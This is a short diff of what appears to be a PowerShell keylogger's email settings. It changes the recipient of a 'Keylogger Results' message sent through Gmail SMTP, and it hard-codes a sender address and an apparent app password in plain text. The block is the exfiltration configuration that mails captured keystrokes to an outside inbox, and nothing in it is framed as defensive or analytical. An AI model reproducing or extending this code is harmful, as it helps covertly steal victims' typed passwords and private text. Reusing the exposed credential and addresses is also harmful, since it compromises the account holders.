@@ -1,7 +1,7 @@
 # Email Configuration
 $From = "billbudofficial@gmail.com"
 $Pass = "rwchezscuvfyojgf"
-$To = "kamalakanta.s@iiits.in"
+$To = "amulyajain123@gmail.com"
 $Subject = "Keylogger Results"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
